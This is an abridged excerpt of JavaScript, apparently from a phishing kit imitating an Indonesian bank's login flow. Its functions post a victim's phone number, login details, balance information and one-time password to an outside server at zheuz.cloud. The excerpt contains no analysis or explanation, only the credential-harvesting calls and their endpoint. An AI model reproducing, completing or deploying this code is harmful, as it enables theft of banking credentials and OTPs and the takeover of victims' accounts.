...
function sendHp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/bri/v9-bb9d/one.php',
...
function sendLogin() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/bri/v9-bb9d/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/bri/v9-bb9d/two.php',
      data: $('#inputlogin').serialize(),
      complete: function(data) {
         vibr(220);
         console.log('Complete')
...
function kirimOtp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zheuz.cloud/bri/v9-bb9d/three.php',
